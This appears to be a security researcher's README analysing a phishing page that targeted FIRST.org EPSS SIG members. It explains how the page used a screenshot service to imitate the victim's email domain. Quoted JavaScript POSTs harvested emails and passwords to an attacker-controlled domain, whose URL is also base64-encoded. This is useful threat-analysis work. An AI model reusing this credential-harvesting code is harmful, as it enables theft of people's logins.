# FIRST.org - A Phishing Attempt

Later this year members of EPSS SIG - FIRST.org were targeted with a phishing email. Being a member of the SIG community i quickly started analyzing the reported email and provided the details to the team to fix the issue. 

The phishing email included a link to a phishing website. Which looked like FIRST.org but with a login page. 

The technique to create the phishing page was unique to what i have seen in the past. So, in this repo I will cover the details. 

> The actual phishing page is provided in this repository for your learnings. 

## Analysis

On clicking the link in the phishing email, the users were redirected to the following domain. 

> https[:]//thescientistt[.]com 

An Indian organization which organizes conference focusing on research in different fields of science and technology etc. 

The domain, was compromised by the threat actors to host the phishing page. `We are not going into how it was compromised as it is out of scope`.

![](https://github.com/deFr0ggy/deFr0ggy.github.io/blob/master/assets/epss1.png?raw=true)

Below code snippet provides us with the details on how the phishing page was being generated. 

```
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var mainPage = 'https://'+my_slice; 
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
var finalu= c.toUpperCase();
	
var sv = my_slice;
		
var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
```

Where `sv` is the value taken from fragment of the URL i.e. the postfix to `@` which is the domain name. 

The domain name is then added to the following URL which is a website to take a screenshot of the full page. 

```
var image = "url('https://image.thum.io/get/width/1200/https://"+sv;"')"
```

Finally, this image is set as the background of the phishing page. 

```
document.body.style.backgroundImage = image;
```

While, this was just to host the Phishing, the actual credentials of the users phished were forwarded to the below domain via a POST request.

> https[:]//ontravelviagens[.]com/

The following is the code where the email and the password are read and are sent to another malicious domain. 

```
	var d=atob('aHR0cHM6Ly9vbnRyYXZlbHZpYWdlbnMuY29tL3dwLWluY2x1ZGVzLy4uLi9qc3MucGhw');
	   $.ajax({
        dataType: 'JSON',
		url: 'https://ontravelviagens.com/wp-includes/jss.php',
        type: 'POST',
        data:{
          email:email,
          password:password
        },
```

> Chaning the email in the URL will actually change the page background to that domain provided in the email address if the domain exists. Thus, the adversary can use the same phishing page for multiple campaigns. 

----

Thanks for reading.
